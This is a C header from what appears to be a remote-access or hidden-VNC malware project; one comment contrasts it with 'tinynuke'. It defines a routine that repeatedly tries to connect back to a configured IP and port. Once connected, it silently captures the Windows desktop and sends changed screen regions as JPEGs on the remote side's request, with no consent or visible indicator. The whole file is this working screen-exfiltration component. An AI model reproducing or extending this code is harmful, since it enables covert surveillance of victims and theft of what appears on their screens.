#ifndef VNC_INCL
#define VNC_INCL
#include <stdio.h>
#include <windows.h>
#include <winuser.h>
#include <stdlib.h>
#include <string.h>
#include "../utils/jpeg.h"
#include "socks.h"
static HDESK dsk;
static int sendframe = 0;
static int fullf = 0;

static void inputthd(){
    while(1){
        char* data = vnc_sock_recv();
        if(data==NULL) return;
        if(data[0]==0x67){
            //full frame send, do not use incremental
            fullf = 1;
        }
        sendframe = 1;
        free(data);
    }
}
void vncspawn(NETWORK* net){
    dsk = GetThreadDesktop(GetCurrentThreadId());
    while(vnc_sock_init(net->ip, net->port) == -1) Sleep(1000);
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)inputthd, NULL, 0, NULL);
    HWND hDesk = GetDesktopWindow();
    RECT rect;
    GetClientRect(hDesk, &rect);
    
    //scaling detect implementation
    HWND curw = GetWindow(GetTopWindow(NULL), GW_HWNDLAST);
    int maxrt = 0;
    int maxbt = 0;
    while(curw != NULL){
        RECT rect2;
        GetClientRect(curw, &rect2);
        if(rect2.right>maxrt)
            maxrt = rect2.right;
        if(rect2.bottom>maxbt)
            maxbt = rect2.bottom;
        curw = GetWindow(curw, GW_HWNDPREV);
    }
    double factor;
    double dx = ((double)maxrt)/((double)rect.right);
    double dy = ((double)maxbt)/((double)rect.bottom);
    if(dx>dy) factor = dx;
    else factor = dy;
    rect.right *= factor;
    rect.bottom *= factor;
    
    //begin vnc
    HDC hdc = GetDC(NULL);
    unsigned char* pastbm = calloc(10000000, 1);
    unsigned char* bitmap;
    //main loop
    while(1){
        while(!sendframe) Sleep(100);
        sendframe=0;
        HDC memdc = CreateCompatibleDC(hdc);
        HBITMAP hbitmap = CreateCompatibleBitmap(hdc, rect.right, rect.bottom);
        SelectObject(memdc, hbitmap);
        BitBlt(memdc, 0, 0, rect.right, rect.bottom, hdc, 0, 0, SRCCOPY);
        
        bitmap = calloc(10000000, 1);
        DWORD cb = GetBitmapBits(hbitmap, 10000000, bitmap);
        int bpb = cb/(rect.right*rect.bottom);
        int top = 0;
        int topset = 0;
        int left = rect.right;
        int bot = 0;
        int right = 0;
        //fullframe send
        if(fullf){
            memset(pastbm, 0, 10000000);
            fullf = 0;
        }
        //otherwise we draw out a rectangle which contains all the changed pixels. we only transmit that instead of fullframe(which tinynuke does), greatly decrease latency
        //esp powerful for decrease typing latency, which is the most annoying one to work with
        for(int i=0;i<cb;i+=bpb){
            if(memcmp(pastbm+i, bitmap+i, bpb)!=0){
                int y = i/(bpb*rect.right);
                if(!topset){
                    top = y;
                    topset = 1;
                }
                int x = (i/bpb)%rect.right;
                if(x<left) left = x;
                if(x>right) right = x;
                if(y>bot) bot = y;
            }
        }
        if(left==rect.right) left=0;
        bot++;
        right++;
        if(bot>rect.bottom) bot = rect.bottom;
        if(right>rect.right) right = rect.right;
        free(pastbm);
        //bitblt the changed rect
        HDC hNew = CreateCompatibleDC(hdc);
        HBITMAP hBmp = CreateCompatibleBitmap(hdc, right - left, bot - top); 
        SelectObject(hNew, hBmp);
        BitBlt(hNew, 0, 0, right - left, bot - top, memdc, left, top, SRCCOPY);
        DeleteObject(hbitmap);
        DeleteDC(memdc);
        pastbm = bitmap;
        int sz = 0;
        //convert to png
        char* jpg = bmptojpg(hBmp, &sz);
        DeleteObject(hBmp);
        DeleteDC(hNew);
        if(vnc_sock_send(jpg, sz, left, top)) break;
    }
    free(bitmap);
    free(net->ip);
    free(net);
}
#endif